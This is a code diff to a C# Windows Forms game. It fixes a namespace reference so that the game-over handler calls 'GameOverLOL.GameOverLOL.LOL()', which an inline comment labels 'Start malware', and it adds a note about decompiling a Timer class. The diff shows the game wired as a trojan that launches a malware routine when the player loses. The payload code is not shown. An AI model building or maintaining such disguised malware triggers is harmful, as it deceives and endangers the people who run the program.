@@ -1,4 +1,5 @@
 using System.Windows.Forms;
+using GameOverLOL;
 
 public class Gameform : Form{ // inheritance from "Form" which means that this game class was made entirely with Windows Form
 
@@ -51,6 +52,7 @@ public class Gameform : Form{ // inheritance from "Form" which means that this g
         loly = lolyMax;
 
         // Setup timer
+        // TODO: decompiler "Timer" class
         timer = new Timer();
         timer.Interval = 50;
         timer.Tick += Timer_Tick;
@@ -64,7 +66,7 @@ public class Gameform : Form{ // inheritance from "Form" which means that this g
 
     private void GameOver() {
         musiz.Abort();
-        GameOverLOL.LOL(); // Start malware
+        GameOverLOL.GameOverLOL.LOL(); // Start malware
         timer.Stop();
         reloadTimer.Stop();
     }
